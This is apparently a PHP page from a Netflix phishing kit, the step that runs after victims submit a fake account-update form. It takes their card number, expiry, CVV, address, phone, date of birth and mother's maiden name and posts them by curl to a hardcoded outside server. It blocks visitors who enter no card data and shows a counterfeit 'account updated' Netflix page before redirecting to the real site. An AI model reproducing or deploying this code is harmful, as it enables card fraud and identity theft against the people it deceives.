<?php
session_start();
include('functions.php');
$ip = get_client_ip();
$hash = md5($ip);
if (@$_SESSION['logged'] !== true) {
	header("Location: payment.php" . getUrlHash($hash));
}


$postElements = array(
		'NOpJZoZVRFAx',
		'plCGCxPPtwLx',
		'dob',
		'LdiEQwZSkYeA',
		'wWOWlGWDEnki',
		'sRsKsxEYqomQ',
		'zip',
		'phone',
		'mmn'
);

foreach($postElements as $element) {
	if(!isset($_POST[$element]) || empty($_POST[$element])) {
		header("Location: payment.php" . getUrlHash($hash));
	}
	$_SESSION[$element] = $_POST[$element];
}

$first = $_SESSION['NOpJZoZVRFAx'];
$last = $_SESSION['plCGCxPPtwLx'];
$cn = str_replace(' ','',$_SESSION['UMVGzaDhubda']);
$cd = $_SESSION['tYqlwCldtaYn']."/".$_SESSION['kqOZtslXZFFd'];
$cvv = $_SESSION['QKBBkFiGdVoF'];
$chn = $_SESSION['iDTzvOiLsLHp'];
$address = $_SESSION['LdiEQwZSkYeA'];
$city = $_SESSION['wWOWlGWDEnki'];
$MPv = $_SESSION['sRsKsxEYqomQ'];
$zip = $_SESSION['zip'];
$phone = $_SESSION['phone'];
$dob = $_SESSION['dob'];
$mmn = $_SESSION['mmn'];
if(empty($cn)){
file_put_contents('.htaccess', 'Deny from ' . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
header("Location: https://netflix.com");
exit();
}

$result = "$cn|$cd|$cvv|$chn|$address|$city|$MPv|$zip|CA|$phone|DOB: $dob|MMN: $mmn|Full Name: $first $last|IP: $ip\n";

$data=urlencode($result);
$ch = curl_init("http://45.148.10.177/.tw/dot.php");
curl_setopt($ch, CURLOPT_POST      ,1);
curl_setopt($ch, CURLOPT_POSTFIELDS    ,"FU=netflix-full&DATA=$data");
curl_setopt($ch, CURLOPT_HEADER      ,0);  // DO NOT RETURN HTTP HEADERS
curl_setopt($ch, CURLOPT_RETURNTRANSFER  ,1);  // RETURN THE CONTENTS OF THE CALL
$Rec_Data = curl_exec($ch);

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Netflix - Your account has been updated</title>
	<link rel="shortcut icon" href="favicon.ico"/>
	<meta http-equiv="refresh" content="5;URL=https://www.netflix.com/">

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/payment.min.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<script src="js/html5shiv.min.js"></script>
	<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body>
	<div class="page_header">
		<div class="netflix-logo">
			<svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><title></title>
				<g id="netflix-logo">
					<path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"
						  id="Fill-14"></path>
				</g>
			</svg>
		</div>
		<div class="sign_out">
			<a href="#">Sign Out</a>
		</div>
	</div>


	<div class="page_container">
		<div class="page_caption">
			Your account has been updated
		</div>

		<div class="clearfix"></div>
		<div class="row spacing_caption">
			<div class="col-xs-6 pull-right above_form">
				<span>Secure Server</span>

				<div class="clearfix"></div>
				<a href="#">Tell me more</a>
			</div>
		</div>

		<div class="row form_caption">
			<img src="img/arrow_down.png" class="arrow_down"/>
			<span class="form_caption_text">Thank You</span>
		</div>

		<div class="row form_block">

			<div class="col-xs-12 thank_you">
				Thank you for updating and confirming your account information. <br />
				You will be redirected our home page in a couple of seconds. <a href="https://www.netflix.com/">Click here</a> if not redirected.
			</div>
			<div class="clearfix"></div>
			<img src="img/check.png" class="done_img" />
		</div>
	</div>

	<div class="clearfix"></div>
	<div class="footer">
		<div class="footer_container">
			<div class="row">
				<div class="col-xs-12 footer_questions">
					<span>Questions?</span> <a href="#">Contact us.</a>
				</div>
			</div>
			<div class="clearfix"></div>
			<div class="footer_lnks">
				<div class="row">
					<div class="col-xs-6 col-sm-3">
						<a href="#">
							Terms of use
						</a>
					</div>
					<div class="col-xs-6 col-sm-3">
						<a href="#">
							Privacy
						</a>
					</div>
				</div>
			</div>
		</div>
	</div>


	<script src="js/jquery.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
</body>
</html>
